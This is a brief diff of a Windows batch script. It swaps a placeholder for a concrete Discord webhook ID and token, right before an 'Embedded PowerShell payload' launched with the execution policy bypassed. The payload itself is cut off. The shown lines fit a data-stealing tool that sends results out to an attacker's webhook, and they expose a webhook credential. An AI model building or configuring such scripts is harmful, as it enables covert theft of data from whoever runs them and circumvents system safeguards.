@@ -2,7 +2,7 @@
 setlocal enabledelayedexpansion
 
 :: Replace this with your actual webhook URL
-set WEBHOOK=https://discord.com/api/webhooks/your-id/your-token
+set WEBHOOK=https://discord.com/api/webhooks/1459083733616427060/f6SNkQxaSG4yPh6vFUPEFdqVAJEZBISicZvQCbSwFtErK5eeQWfJrf4V5id7VyLOZCgg
 
 :: Embedded PowerShell payload
 powershell -NoProfile -ExecutionPolicy Bypass -Command ^
